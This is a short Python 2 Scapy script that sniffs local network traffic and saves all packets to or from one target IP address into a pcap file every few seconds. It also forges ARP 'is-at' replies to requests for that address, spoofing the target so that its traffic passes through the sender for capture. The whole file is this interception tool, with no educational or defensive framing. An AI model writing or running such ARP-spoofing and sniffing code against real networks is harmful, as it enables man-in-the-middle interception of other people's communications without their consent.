from scapy.all import *
import os, threading

saving_interval = 5
filter_ip = '192.168.2.119'
pkts = []

def monitor_callback(pkt):
  if IP in pkt:
    print pkt.sprintf("Got packet from %IP.src%(%src%) to %IP.dst%(%dst%)")
    if pkt[IP].src == filter_ip or pkt[IP].dst == filter_ip:
      pkts.append(pkt)
      print "Saved !"
      #return pkt.show()
  if ARP in pkt and pkt[ARP].op in (1, 2):
    print pkt.sprintf(("who-has" if pkt[ARP].op == 1 else "is-at")+" from %ARP.psrc%(%ARP.hwsrc%) to %ARP.pdst%(%ARP.hwdst%)")
    if pkt[ARP].op == 1 and pkt[ARP].pdst == filter_ip: #who-has reuest
      p = ARP(op="is-at", psrc=pkt[ARP].pdst, pdst=pkt[ARP].psrc, hwdst=pkt[ARP].hwsrc)
      sr(p)

def save(filename = "capture.pcap"):
  if(len(pkts) > 0):
    wrpcap(filename, pkts)
  threading.Timer(saving_interval, save).start()

save()

sniff(prn=monitor_callback, filter="ip or arp", store=0)
# Ether(dst=pkt[ARP].hwsrc)/

